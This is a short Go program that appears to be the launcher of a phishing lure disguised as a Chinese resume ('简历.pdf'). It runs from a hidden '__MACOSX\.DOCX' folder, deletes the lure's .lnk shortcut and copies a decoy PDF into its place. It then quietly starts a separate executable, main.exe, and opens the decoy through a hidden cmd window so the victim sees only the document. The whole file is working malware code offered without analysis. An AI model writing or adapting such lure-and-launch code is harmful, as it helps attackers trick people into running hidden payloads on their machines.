package main

import (
	"bufio"
	"io"
	"os/exec"
	"strings"
	"syscall"
	"time"

	"os"
)

func CopyFile(dstFilePath string, srcFilePath string) (written int64, err error) {
	srcFile, _ := os.Open(srcFilePath)
	defer srcFile.Close()
	reader := bufio.NewReader(srcFile)
	dstFile, _ := os.OpenFile(dstFilePath, os.O_WRONLY|os.O_CREATE, 0777)
	writer := bufio.NewWriter(dstFile)
	defer dstFile.Close()
	return io.Copy(writer, reader)
}

func main() {

	srcFile, _ := os.Executable()

	str2 := strings.Replace(srcFile, "wss.exe", "简历.pdf", -1)
	str1 := strings.Replace(srcFile, "__MACOSX\\.DOCX\\wss.exe", "简历.pdf", -1)
	strc := strings.Replace(srcFile, "__MACOSX\\.DOCX\\wss.exe", "简历.pdf.lnk", -1)
	strm := strings.Replace(srcFile, "wss.exe", "main.exe", -1)
	err := os.Remove(strc)
	CopyFile(str1, str2)
	if err != nil {

		// 删除失败

	} else {

		// 删除成功

	}
	time.Sleep(time.Duration(2) * time.Second)
	cmd := exec.Command(strm)
	_ = cmd.Start()
	cmds := exec.Command("cmd", " /c ", str1)
	cmds.SysProcAttr = &syscall.SysProcAttr{HideWindow: true}
	_ = cmds.Start()

}
